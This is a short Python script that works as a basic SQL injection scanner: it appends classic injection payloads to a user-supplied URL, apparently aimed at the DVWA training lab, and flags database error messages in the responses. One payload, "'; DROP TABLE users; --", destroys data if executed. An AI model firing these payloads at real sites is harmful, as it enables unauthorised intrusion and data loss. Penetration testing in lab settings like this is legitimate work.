import requests
from colorama import Fore, Style

payloads = [
    "'",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "'; DROP TABLE users; --"
]

sql_errors = [
    "you have an error in your sql syntax;",
    "warning: mysql_",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pdoexception",
    "microsoft ole db provider"
]

def test_sqli(url):
    print(f"\n[+] Testing URL: {url}")
    vulnerable = False

    for payload in payloads:
        test_url = url + payload
        try:
            res = requests.get(test_url, timeout=5)
            for error in sql_errors:
                if error.lower() in res.text.lower():
                    print(Fore.RED + f"[!] Vulnerability detected with payload: {payload}" + Style.RESET_ALL)
                    vulnerable = True
                    break
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"[!] Error reaching {test_url}: {e}" + Style.RESET_ALL)

        if vulnerable:
            break

    if not vulnerable:
        print(Fore.GREEN + "[+] No SQLi vulnerability detected." + Style.RESET_ALL)

if __name__ == "__main__":
    url = input("Enter URL (e.g. http://192.168.1.45/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1):\n> ")
    test_sqli(url)
